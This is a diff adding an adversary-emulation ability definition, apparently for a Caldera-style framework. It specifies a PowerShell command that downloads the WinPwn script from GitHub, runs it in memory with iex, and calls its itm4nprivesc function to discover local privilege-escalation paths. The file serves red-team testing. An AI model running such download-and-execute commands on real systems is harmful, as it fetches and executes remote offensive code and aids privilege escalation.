@@ -1,0 +1,20 @@
+---
+- id: 2501423ea9f049ae6de6765cffa2a929
+  name: WinPwn - itm4nprivesc
+  description: Discover Local Privilege Escalation possibilities using itm4nprivesc
+    function of WinPwn
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
+  platforms:
+    windows:
+      psh:
+        command: $S3cur3Th1sSh1t_repo = 'https://raw.githubusercontent.com/S3cur3Th1sSh1t';
+          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          itm4nprivesc -noninteractive -consoleoutput
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
